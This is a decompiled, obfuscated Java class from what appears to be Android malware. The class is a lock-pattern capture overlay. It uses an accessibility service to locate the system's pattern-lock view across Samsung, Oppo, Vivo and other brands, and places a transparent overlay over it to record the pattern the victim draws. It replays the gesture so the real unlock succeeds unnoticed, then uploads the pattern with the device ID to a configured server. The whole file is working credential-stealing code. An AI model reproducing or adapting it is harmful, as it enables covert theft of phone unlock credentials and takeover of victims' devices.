package com.storm.safe.rock.service.modules.cipher;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.graphics.Color;
import android.graphics.Path;
import android.graphics.PointF;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.TypedValue;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.AbstractC0385a0;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.AbstractC0780a0;
import kotlinx.coroutines.android.C0785a0;
import okhttp3.OkHttpClient;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC0717jg;
import p000.AbstractC1117qo;
import p000.AbstractC1262tj;
import p000.C0107as;
import p000.C0598hx;
import p000.C0873ms;
import p000.C1180rh;
import p000.C1351vv;
import p000.ExecutorC1158qw;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.h10;
import p000.i60;
import p000.kg1;
import p000.l10;
import p000.n10;
import p000.rm0;
import p000.sc0;
import p000.sm0;
import p000.t60;
import p000.tz0;
import p000.w00;
import p000.wm0;
import p000.xm0;
import p000.y21;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.cipher.a3 */
/* loaded from: classes2.dex */
public final class C0337a3 {

    /* renamed from: b6 */
    public static final sm0 f53343b6 = new sm0(null);

    /* renamed from: b7 */
    public static volatile C0337a3 f53344b7;

    /* renamed from: b8 */
    public static volatile xm0 f53345b8;

    /* renamed from: a0 */
    public final AccessibilityService f53346a0;

    /* renamed from: a1 */
    public final Context f53347a1;

    /* renamed from: a2 */
    public WindowManager f53348a2;

    /* renamed from: a7 */
    public volatile boolean f53353a7;

    /* renamed from: a8 */
    public Rect f53354a8;

    /* renamed from: a9 */
    public Rect f53355a9;

    /* renamed from: b0 */
    public int f53356b0;

    /* renamed from: b1 */
    public n10 f53357b1;

    /* renamed from: b2 */
    public w00 f53358b2;

    /* renamed from: b4 */
    public final OkHttpClient f53360b4;

    /* renamed from: b5 */
    public final C0873ms f53361b5;

    /* renamed from: a3 */
    public final AtomicReference f53349a3 = new AtomicReference(null);

    /* renamed from: a4 */
    public final ReentrantLock f53350a4 = new ReentrantLock();

    /* renamed from: a5 */
    public final ArrayList f53351a5 = new ArrayList();

    /* renamed from: a6 */
    public final AtomicReference f53352a6 = new AtomicReference(null);

    /* renamed from: b3 */
    public final Handler f53359b3 = new Handler(Looper.getMainLooper());

    public C0337a3(AccessibilityService accessibilityService, Context context) {
        this.f53346a0 = accessibilityService;
        this.f53347a1 = context;
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        this.f53360b4 = builder.connectTimeout(5L, timeUnit).readTimeout(5L, timeUnit).build();
        ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
        y21 y21Var = new y21();
        executorC1158qw.getClass();
        this.f53361b5 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(executorC1158qw, y21Var));
        Object systemService = context.getSystemService("window");
        t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
        this.f53348a2 = (WindowManager) systemService;
    }

    /* renamed from: a0 */
    public static final boolean m211837a0(C0337a3 c0337a3, ArrayList arrayList) {
        List listM213303j0 = AbstractC0715je.m213303j0(arrayList);
        if (listM213303j0.size() < 2) {
            t60.m214726f4("PatternCaptureOverlay", "图案点数不足，跳过重放");
            return false;
        }
        try {
            Path path = new Path();
            path.moveTo(((PointF) listM213303j0.get(0)).x, ((PointF) listM213303j0.get(0)).y);
            int size = listM213303j0.size();
            for (int i = 1; i < size; i++) {
                path.lineTo(((PointF) listM213303j0.get(i)).x, ((PointF) listM213303j0.get(i)).y);
            }
            boolean zDispatchGesture = c0337a3.f53346a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 300L)).build(), null, null);
            t60.m214714d6("PatternCaptureOverlay", "手势重放已分发 (fire-and-forget): result=" + zDispatchGesture + ", points=" + listM213303j0.size());
            return zDispatchGesture;
        } catch (Exception e) {
            tz0.m214807a7("replayGestureOnSystemSync error: ", e.getMessage(), "PatternCaptureOverlay");
            return false;
        }
    }

    /* renamed from: a1 */
    public static final void m211838a1(C0337a3 c0337a3, List list) {
        C0323a8 c0323a8M211471g5;
        String strM211644b0;
        Context context = c0337a3.f53347a1;
        if (list.isEmpty()) {
            t60.m214726f4("PatternCaptureOverlay", "❌ saveCipherToLocalService: 索引为空，跳过保存");
            return;
        }
        t60.m214714d6("PatternCaptureOverlay", "🔷 saveCipherToServer: 上传 " + list.size() + " 个点, indices=" + AbstractC0715je.m213295i2(list, "-", null, null, null, 62));
        try {
            String strM213295i2 = AbstractC0715je.m213295i2(list, ",", null, null, null, 62);
            C0107as.f45610a3.getInstance(context).m210507a6("pattern", true, strM213295i2);
            t60.m214714d6("PatternCaptureOverlay", "✅ 图案已同步到 AppStatusManager: ".concat(strM213295i2));
        } catch (Exception e) {
            tz0.m214810b0("⚠️ 同步 AppStatusManager 失败: ", e.getMessage(), "PatternCaptureOverlay");
        }
        dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
        if (c0290a0 == null || (c0323a8M211471g5 = c0290a0.m211471g5()) == null || (strM211644b0 = c0323a8M211471g5.m211644b0()) == null) {
            t60.m214726f4("PatternCaptureOverlay", "⚠️ 无法获取服务器地址，跳过上传");
            return;
        }
        i60 h60Var = i60.f56802a1.getInstance(context);
        h60Var.getClass();
        String string = null;
        try {
            string = h60Var.f56805a0.getSharedPreferences(i60.f56803a2, 0).getString("device_id", null);
        } catch (Exception e2) {
            t60.m214705c6("InstallationStateMgr", "获取设备ID失败", e2);
        }
        if (string == null) {
            string = "unknown";
        }
        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, AbstractC1262tj.f60234a1, new PatternCaptureOverlay$saveCipherToLocalService$1(strM211644b0, string, c0337a3, list, null), 2);
    }

    /* renamed from: a2 */
    public final void m211839a2(C0336a2 c0336a2) throws Resources.NotFoundException, PackageManager.NameNotFoundException {
        DotAlign dotAlign = DotAlign.f53236a0;
        xm0 xm0VarM211846a9 = f53345b8;
        if (xm0VarM211846a9 == null) {
            xm0VarM211846a9 = m211846a9();
            if (xm0VarM211846a9 != null) {
                f53345b8 = xm0VarM211846a9;
            } else {
                xm0VarM211846a9 = null;
            }
        }
        if (xm0VarM211846a9 != null) {
            c0336a2.setNormalStateColor(xm0VarM211846a9.f61160a3);
            c0336a2.setDotSelectedColor(xm0VarM211846a9.f61160a3);
            c0336a2.setCorrectStateColor(xm0VarM211846a9.f61160a3);
            c0336a2.setDotNormalSize(xm0VarM211846a9.f61157a0);
            c0336a2.setDotSelectedSize(xm0VarM211846a9.f61159a2);
            c0336a2.setInnerDotSize(xm0VarM211846a9.f61158a1);
            c0336a2.setOuterCircleAlpha(xm0VarM211846a9.f61163a6);
            c0336a2.setPathWidth(xm0VarM211846a9.f61162a5);
            c0336a2.setPathColor(xm0VarM211846a9.f61161a4);
            String str = Build.BRAND;
            t60.m214694b5(str, "BRAND");
            String lowerCase = str.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            c0336a2.setAspectRatio((lowerCase.equals("oppo") || lowerCase.equals("realme") || lowerCase.equals("oneplus")) ? 1 : 0);
            c0336a2.setDotAlign(dotAlign);
            c0336a2.setDotAnimationDuration(150);
            c0336a2.setPathEndAnimationDuration(100);
            return;
        }
        t60.m214726f4("PatternCaptureOverlay", "SystemUI资源不可用，使用品牌兜底参数");
        int iM211842a5 = m211842a5();
        int i = (int) (Resources.getSystem().getDisplayMetrics().density * 3.0f);
        if (i < 3) {
            i = 3;
        }
        if (AbstractC1117qo.m214448e4()) {
            c0336a2.setNormalStateColor(1291845632);
            c0336a2.setCorrectStateColor(1291845632);
            c0336a2.setDotSelectedColor(1291845632);
            c0336a2.setDotNormalSize(30);
            c0336a2.setDotSelectedSize(60);
            c0336a2.setPathWidth(6);
            c0336a2.setPathColor(-16777216);
            c0336a2.setAspectRatio(1);
        } else {
            String str2 = Build.BRAND;
            if (AbstractC0779a1.m213656a9(str2, "samsung")) {
                c0336a2.setNormalStateColor(-3355444);
                c0336a2.setCorrectStateColor(-3355444);
                c0336a2.setDotSelectedColor(-3355444);
                c0336a2.setDotNormalSize(36);
                c0336a2.setDotSelectedSize(50);
                c0336a2.setPathWidth(10);
                c0336a2.setPathColor(-1);
                c0336a2.setAspectRatio(0);
                c0336a2.setDotAlign(dotAlign);
                c0336a2.setDotAnimationDuration(100);
                c0336a2.setPathEndAnimationDuration(200);
                return;
            }
            if (AbstractC1117qo.m214446e2()) {
                c0336a2.setNormalStateColor(-1);
                c0336a2.setCorrectStateColor(-1);
                c0336a2.setDotNormalSize(32);
                c0336a2.setDotSelectedSize(50);
                c0336a2.setDotSelectedColor(-1);
                c0336a2.setPathWidth(20);
                c0336a2.setPathColor(-7829368);
            } else if (AbstractC1117qo.m214449e5()) {
                c0336a2.setNormalStateColor(-3355444);
                c0336a2.setCorrectStateColor(-3355444);
                c0336a2.setDotSelectedSize(40);
                c0336a2.setDotSelectedColor(-256);
                c0336a2.setPathWidth(30);
                c0336a2.setPathColor(Color.parseColor("#FFF68F"));
                c0336a2.setAspectRatio(0);
                c0336a2.setDotNormalSize(20);
            } else {
                if (!AbstractC1117qo.m214450e6() && !AbstractC0779a1.m213656a9(str2, "tecno") && !AbstractC0779a1.m213656a9(str2, "itel") && !AbstractC0779a1.m213656a9(str2, "infinix")) {
                    c0336a2.setNormalStateColor(iM211842a5);
                    c0336a2.setCorrectStateColor(iM211842a5);
                    c0336a2.setDotNormalSize(30);
                    c0336a2.setDotSelectedSize(60);
                    c0336a2.setDotSelectedColor(iM211842a5);
                    c0336a2.setPathWidth(i);
                    c0336a2.setPathColor(iM211842a5);
                    c0336a2.setAspectRatio(0);
                    c0336a2.setDotAlign(dotAlign);
                    c0336a2.setDotAnimationDuration(50);
                    c0336a2.setPathEndAnimationDuration(50);
                    return;
                }
                c0336a2.setNormalStateColor(-1);
                c0336a2.setCorrectStateColor(-1);
                c0336a2.setDotNormalSize(20);
                c0336a2.setDotSelectedSize(30);
                c0336a2.setDotSelectedColor(-1);
                c0336a2.setPathWidth(5);
                c0336a2.setPathColor(-1);
            }
        }
        c0336a2.setAspectRatio(0);
        c0336a2.setDotAlign(dotAlign);
        c0336a2.setDotAnimationDuration(150);
        c0336a2.setPathEndAnimationDuration(100);
    }

    /* renamed from: a3 */
    public final void m211840a3(Rect rect) {
        int i;
        int i2 = this.f53347a1.getResources().getDisplayMetrics().widthPixels;
        if (i2 <= 0 || (i = rect.left) <= 0 || i < i2) {
            return;
        }
        int i3 = i - i2;
        rect.left = i3;
        int i4 = rect.right - i2;
        rect.right = i4;
        t60.m214702c3("PatternCaptureOverlay", "坐标已修正: left=" + i3 + ", right=" + i4);
    }

    /* renamed from: a4 */
    public final void m211841a4() {
        AtomicReference atomicReference = this.f53349a3;
        Context context = this.f53347a1;
        try {
            wm0 wm0VarM211844a7 = m211844a7();
            if (wm0VarM211844a7 == null) {
                t60.m214726f4("PatternCaptureOverlay", "未找到系统图案锁");
                return;
            }
            Rect rect = wm0VarM211844a7.f60946a0;
            this.f53351a5.clear();
            this.f53354a8 = rect;
            this.f53355a9 = wm0VarM211844a7.f60947a1;
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
            layoutParams.flags = 4786090;
            layoutParams.format = 1;
            layoutParams.alpha = 1.0f;
            layoutParams.dimAmount = 0.05f;
            layoutParams.gravity = 8388659;
            layoutParams.x = rect.left;
            layoutParams.y = rect.top;
            layoutParams.width = rect.width();
            layoutParams.height = rect.height();
            t60.m214702c3("PatternCaptureOverlay", "screenWidth:" + rect.width());
            t60.m214702c3("PatternCaptureOverlay", "screenHeight:" + rect.height());
            t60.m214702c3("PatternCaptureOverlay", "bounds: left=" + rect.left + ", top=" + rect.top + ", right=" + rect.right + ", bottom=" + rect.bottom);
            t60.m214714d6("PatternCaptureOverlay", "★ createPatternView: Build.BRAND=" + Build.BRAND + ", Build.MANUFACTURER=" + Build.MANUFACTURER + ", Build.MODEL=" + Build.MODEL);
            final C0336a2 c0336a2 = new C0336a2(context);
            c0336a2.setAspectRatioEnabled(true);
            c0336a2.setInputEnabled(true);
            c0336a2.setDotCount(3);
            m211839a2(c0336a2);
            c0336a2.setSystemUiVisibility(4);
            c0336a2.setImportantForAccessibility(2);
            if (Build.VERSION.SDK_INT >= 30) {
                c0336a2.setImportantForContentCapture(2);
            }
            c0336a2.setBackgroundColor(0);
            t60.m214714d6("PatternCaptureOverlay", "★ 覆盖层背景: 透明(与系统弹窗背景一致)");
            c0336a2.setFocusable(true);
            c0336a2.setFocusableInTouchMode(true);
            c0336a2.setFilterTouchesWhenObscured(false);
            c0336a2.setOnPatternComplete(new h10() { // from class: com.storm.safe.rock.service.modules.cipher.PatternCaptureOverlay$createPatternView$1

                /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
                @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.cipher.PatternCaptureOverlay$createPatternView$1$2", m214403f = "PatternCaptureOverlay.kt", m214404l = {228, 235, 241, 241}, m214405m = "invokeSuspend")
                /* renamed from: com.storm.safe.rock.service.modules.cipher.PatternCaptureOverlay$createPatternView$1$2 */
                final class C03322 extends SuspendLambda implements l10 {

                    /* renamed from: a1 */
                    public Throwable f53248a1;

                    /* renamed from: a2 */
                    public int f53249a2;

                    /* renamed from: a3 */
                    public final /* synthetic */ C0337a3 f53250a3;

                    /* renamed from: a4 */
                    public final /* synthetic */ List f53251a4;

                    /* renamed from: a5 */
                    public final /* synthetic */ List f53252a5;

                    /* renamed from: a6 */
                    public final /* synthetic */ ArrayList f53253a6;

                    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
                    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.cipher.PatternCaptureOverlay$createPatternView$1$2$1", m214403f = "PatternCaptureOverlay.kt", m214404l = {}, m214405m = "invokeSuspend")
                    /* renamed from: com.storm.safe.rock.service.modules.cipher.PatternCaptureOverlay$createPatternView$1$2$1, reason: invalid class name */
                    final class AnonymousClass1 extends SuspendLambda implements l10 {

                        /* renamed from: a1 */
                        public final /* synthetic */ C0337a3 f53254a1;

                        /* renamed from: a2 */
                        public final /* synthetic */ List f53255a2;

                        /* renamed from: a3 */
                        public final /* synthetic */ ArrayList f53256a3;

                        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                        public AnonymousClass1(C0337a3 c0337a3, List list, ArrayList arrayList, InterfaceC0876mv interfaceC0876mv) {
                            super(2, interfaceC0876mv);
                            this.f53254a1 = c0337a3;
                            this.f53255a2 = list;
                            this.f53256a3 = arrayList;
                        }

                        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
                        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
                            return new AnonymousClass1(this.f53254a1, this.f53255a2, this.f53256a3, interfaceC0876mv);
                        }

                        @Override // p000.l10
                        public final Object invoke(Object obj, Object obj2) {
                            return ((AnonymousClass1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
                        }

                        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
                        public final Object invokeSuspend(Object obj) throws Throwable {
                            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
                            kg1.m213544f4(obj);
                            C0337a3 c0337a3 = this.f53254a1;
                            n10 n10Var = c0337a3.f53357b1;
                            if (n10Var != null) {
                                List list = this.f53255a2;
                                ArrayList arrayList = this.f53256a3;
                                Rect rect = c0337a3.f53354a8;
                                Rect rect2 = c0337a3.f53355a9;
                                CipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$1 cipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$1 = (CipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$1) n10Var;
                                cipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$1.getClass();
                                List list2 = list;
                                ArrayList arrayList2 = arrayList;
                                t60.m214695b6(list2, "pattern");
                                t60.m214695b6(arrayList2, "screenPoints");
                                String strM213295i2 = AbstractC0715je.m213295i2(list2, "-", null, null, null, 62);
                                int size = arrayList2.size();
                                boolean z = cipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$1.f53221a0.f53306c0 != null;
                                StringBuilder sbM40c1 = AbstractC0003a2.m40c1("✅ 图案已捕获: indices=", strM213295i2, ", screenPoints=", size, ", boundsInScreen=");
                                sbM40c1.append(rect);
                                sbM40c1.append(", boundsInParent=");
                                sbM40c1.append(rect2);
                                sbM40c1.append(", pendingCipher之前=");
                                sbM40c1.append(z);
                                t60.m214714d6("CipherCaptureManager", sbM40c1.toString());
                                C0335a1 c0335a1 = cipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$1.f53221a0;
                                c0335a1.f53306c0 = new C0598hx("PASSWORD_QUALITY_PATTERN", AbstractC0715je.m213295i2(list2, ",", null, null, null, 62), list2, arrayList2, true, System.currentTimeMillis(), rect, rect2, null, 768);
                                ArrayList arrayList3 = c0335a1.f53303b7;
                                int size2 = arrayList3.size();
                                int i = 0;
                                while (i < size2) {
                                    Object obj2 = arrayList3.get(i);
                                    i++;
                                    c0335a1.f53294a8.removeCallbacks((Runnable) obj2);
                                }
                                c0335a1.f53303b7.clear();
                                t60.m214714d6("CipherCaptureManager", "📦 图案已缓冲: indices=" + AbstractC0715je.m213295i2(list2, "-", null, null, null, 62) + ", screenPoints=" + arrayList2.size() + " (等待验证后保存)");
                                t60.m214714d6("CipherCaptureManager", "✅ bufferCapturedPattern 完成, pendingCipher现在=" + (cipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$1.f53221a0.f53306c0 != null));
                                t60.m214714d6("CipherCaptureManager", "✅ 图案密码保存结果: " + cipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$1.f53221a0.m211812b1());
                                C1351vv c1351vv = C1351vv.f60710b1;
                            }
                            w00 w00Var = c0337a3.f53358b2;
                            if (w00Var == null) {
                                return null;
                            }
                            ((CipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$2) w00Var).invoke();
                            return C1351vv.f60710b1;
                        }
                    }

                    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                    public C03322(C0337a3 c0337a3, List list, List list2, ArrayList arrayList, InterfaceC0876mv interfaceC0876mv) {
                        super(2, interfaceC0876mv);
                        this.f53250a3 = c0337a3;
                        this.f53251a4 = list;
                        this.f53252a5 = list2;
                        this.f53253a6 = arrayList;
                    }

                    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
                    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
                        return new C03322(this.f53250a3, this.f53251a4, this.f53252a5, this.f53253a6, interfaceC0876mv);
                    }

                    @Override // p000.l10
                    public final Object invoke(Object obj, Object obj2) {
                        return ((C03322) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
                    }

                    /* JADX WARN: Code restructure failed: missing block: B:31:0x00b1, code lost:
                    
                        if (kotlinx.coroutines.AbstractC0780a0.m213696a7(r14, r1, r13) != r0) goto L33;
                     */
                    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
                    /*
                        Code decompiled incorrectly, please refer to instructions dump.
                    */
                    public final Object invokeSuspend(Object obj) throws Throwable {
                        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
                        int i = this.f53249a2;
                        try {
                        } catch (Throwable th) {
                            this.f53250a3.f53353a7 = false;
                            C0337a3.m211838a1(this.f53250a3, this.f53252a5);
                            C1180rh c1180rh = AbstractC1262tj.f60233a0;
                            C0785a0 c0785a0 = sc0.f59953a0;
                            AnonymousClass1 anonymousClass1 = new AnonymousClass1(this.f53250a3, this.f53252a5, this.f53253a6, null);
                            this.f53248a1 = th;
                            this.f53249a2 = 4;
                            if (AbstractC0780a0.m213696a7(c0785a0, anonymousClass1, this) != coroutineSingletons) {
                                throw th;
                            }
                        }
                        if (i == 0) {
                            kg1.m213544f4(obj);
                            this.f53249a2 = 1;
                            if (b81.m210571b1(1000L, this) == coroutineSingletons) {
                            }
                            return coroutineSingletons;
                        }
                        if (i == 1) {
                            kg1.m213544f4(obj);
                        } else {
                            if (i != 2) {
                                if (i == 3) {
                                    kg1.m213544f4(obj);
                                    return C1351vv.f60710b1;
                                }
                                if (i != 4) {
                                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                                }
                                Throwable th2 = this.f53248a1;
                                kg1.m213544f4(obj);
                                throw th2;
                            }
                            kg1.m213544f4(obj);
                            this.f53250a3.f53353a7 = false;
                            C0337a3.m211838a1(this.f53250a3, this.f53252a5);
                            C1180rh c1180rh2 = AbstractC1262tj.f60233a0;
                            C0785a0 c0785a02 = sc0.f59953a0;
                            AnonymousClass1 anonymousClass12 = new AnonymousClass1(this.f53250a3, this.f53252a5, this.f53253a6, null);
                            this.f53249a2 = 3;
                        }
                        C0337a3 c0337a3 = this.f53250a3;
                        List<PointF> list = this.f53251a4;
                        ArrayList arrayList = new ArrayList(AbstractC0717jg.m213310g9(list));
                        for (PointF pointF : list) {
                            arrayList.add(new PointF(pointF.x, pointF.y));
                        }
                        boolean zM211837a0 = C0337a3.m211837a0(c0337a3, arrayList);
                        t60.m214714d6("PatternCaptureOverlay", "★ 手势回放结果: " + zM211837a0);
                        if (zM211837a0) {
                            this.f53249a2 = 2;
                            if (b81.m210571b1(1000L, this) != coroutineSingletons) {
                            }
                            return coroutineSingletons;
                        }
                        this.f53250a3.f53353a7 = false;
                        C0337a3.m211838a1(this.f53250a3, this.f53252a5);
                        C1180rh c1180rh22 = AbstractC1262tj.f60233a0;
                        C0785a0 c0785a022 = sc0.f59953a0;
                        AnonymousClass1 anonymousClass122 = new AnonymousClass1(this.f53250a3, this.f53252a5, this.f53253a6, null);
                        this.f53249a2 = 3;
                    }
                }

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(1);
                }

                @Override // p000.h10
                public final Object invoke(Object obj) {
                    List<PointF> list = (List) obj;
                    t60.m214695b6(list, "points");
                    if (this.f53246a0.f53350a4.tryLock()) {
                        try {
                            this.f53246a0.f53351a5.clear();
                            this.f53246a0.f53351a5.addAll(list);
                            List<Integer> selectedPattern = c0336a2.getSelectedPattern();
                            t60.m214714d6("PatternCaptureOverlay", "★ onPatternComplete: indices=" + AbstractC0715je.m213295i2(selectedPattern, "-", null, null, null, 62) + ", points=" + list.size());
                            List listM213303j0 = AbstractC0715je.m213303j0(list);
                            List listM213303j02 = AbstractC0715je.m213303j0(selectedPattern);
                            ArrayList arrayList = new ArrayList(AbstractC0717jg.m213310g9(list));
                            for (PointF pointF : list) {
                                arrayList.add(new android.graphics.Point((int) pointF.x, (int) pointF.y));
                            }
                            C0336a2 c0336a22 = c0336a2;
                            c0336a22.f53313a2.clear();
                            c0336a22.m211831a1();
                            c0336a22.f53328b7 = false;
                            c0336a22.f53332c1 = -1.0f;
                            c0336a22.f53333c2 = -1.0f;
                            c0336a2.invalidate();
                            this.f53246a0.m211847b0();
                            this.f53246a0.f53353a7 = true;
                            this.f53246a0.f53350a4.unlock();
                            C0337a3 c0337a3 = this.f53246a0;
                            AbstractC0780a0.m213692a3(c0337a3.f53361b5, AbstractC1262tj.f60233a0, new C03322(c0337a3, listM213303j0, listM213303j02, arrayList, null), 2);
                        } catch (Throwable th) {
                            this.f53246a0.f53350a4.unlock();
                            throw th;
                        }
                    } else {
                        t60.m214726f4("PatternCaptureOverlay", "★ onPatternComplete: tryLock 失败，跳过（锁被占用）");
                    }
                    return C1351vv.f60710b1;
                }
            });
            if (this.f53348a2 == null) {
                Object systemService = context.getSystemService("window");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
                this.f53348a2 = (WindowManager) systemService;
            }
            layoutParams.type = 2032;
            if (atomicReference.get() == null) {
                WindowManager windowManager = this.f53348a2;
                if (windowManager != null) {
                    windowManager.addView(c0336a2, layoutParams);
                }
                atomicReference.set(c0336a2);
                t60.m214702c3("PatternCaptureOverlay", "patternLockView 创建完成");
            }
        } catch (Exception e) {
            tz0.m214807a7("createPatternView error: ", e.getMessage(), "PatternCaptureOverlay");
        }
    }

    /* renamed from: a5 */
    public final int m211842a5() {
        boolean z = (this.f53347a1.getResources().getConfiguration().uiMode & 48) == 32;
        int i = z ? 1728053247 : 1291845632;
        t60.m214714d6("PatternCaptureOverlay", "★ 主题检测: isDarkMode=" + z + " → 颜色=#" + Integer.toHexString(i));
        return i;
    }

    /* renamed from: a6 */
    public final wm0 m211843a6(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        try {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str);
            t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "nodes");
            if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                Rect rect = new Rect();
                listFindAccessibilityNodeInfosByViewId.get(0).getBoundsInScreen(rect);
                m211840a3(rect);
                Rect rect2 = new Rect();
                listFindAccessibilityNodeInfosByViewId.get(0).getBoundsInParent(rect2);
                if (rect.width() > 50 && rect.height() > 50) {
                    this.f53354a8 = rect;
                    t60.m214702c3("PatternCaptureOverlay", "找到图案锁: " + str + ", boundsInScreen=" + rect + ", boundsInParent=" + rect2);
                    Iterator<T> it = listFindAccessibilityNodeInfosByViewId.iterator();
                    while (it.hasNext()) {
                        ((AccessibilityNodeInfo) it.next()).recycle();
                    }
                    return new wm0(rect, rect2);
                }
                t60.m214702c3("PatternCaptureOverlay", "跳过无效 bounds: " + str + ", bounds=" + rect + " (太小)");
                Iterator<T> it2 = listFindAccessibilityNodeInfosByViewId.iterator();
                while (it2.hasNext()) {
                    ((AccessibilityNodeInfo) it2.next()).recycle();
                }
            }
            return null;
        } catch (Exception e) {
            t60.m214704c5("PatternCaptureOverlay", "findPatternNodeById(" + str + ") error: " + e.getMessage());
            return null;
        }
    }

    /* renamed from: a7 */
    public final wm0 m211844a7() {
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f53346a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                Iterator it = AbstractC0716jf.m213306g5("com.android.systemui:id/lockPattern", "com.android.settings:id/lockPattern", "com.samsung.android.biometrics.app.setting:id/lockPattern", "com.android.systemui:id/biometric_lockPattern", "com.android.settings:id/biometric_lockPattern", "com.samsung.android.biometrics.app.setting:id/biometric_lockPattern").iterator();
                while (it.hasNext()) {
                    wm0 wm0VarM211843a6 = m211843a6(rootInActiveWindow, (String) it.next());
                    if (wm0VarM211843a6 != null) {
                        return wm0VarM211843a6;
                    }
                }
                if (AbstractC1117qo.m214448e4()) {
                    return m211843a6(rootInActiveWindow, "com.android.systemui:id/colorLockPatternView");
                }
                if (AbstractC1117qo.m214449e5()) {
                    return m211843a6(rootInActiveWindow, "com.android.systemui:id/vivo_lock_pattern_view");
                }
                wm0 wm0VarM211843a62 = m211843a6(rootInActiveWindow, "com.android.systemui:id/lockPatternView");
                if (wm0VarM211843a62 != null) {
                    return wm0VarM211843a62;
                }
            }
            return null;
        } catch (Exception e) {
            tz0.m214807a7("findSystemPatternView error: ", e.getMessage(), "PatternCaptureOverlay");
            return null;
        }
    }

    /* renamed from: a8 */
    public final boolean m211845a8() {
        return !(this.f53349a3.get() == null || this.f53348a2 == null) || this.f53353a7;
    }

